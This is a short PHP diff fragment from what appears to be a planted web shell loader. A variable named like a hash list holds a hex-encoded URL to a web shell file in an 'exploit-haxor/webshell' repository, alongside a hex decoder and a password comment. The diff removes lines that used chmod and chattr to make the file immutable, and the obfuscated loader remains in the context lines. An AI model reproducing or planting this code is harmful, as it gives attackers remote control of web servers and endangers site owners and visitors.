@@ -1,7 +1,6 @@
 <?php
 # Jangan Edit bangian sini kalo tidak mau error
-@system("chmod ugo-w $this_file");
-@system("chattr +i $this_file");
+
 $md5_hashes = '68747470733a2f2f7261772e67697468756275736572636f6e74656e742e636f6d2f6578706c6f69742d6861786f722f7765627368656c6c2f6d61696e2f6d79666b2e706870'; 
 // password : bar ki not
 function hex2str($hex) {
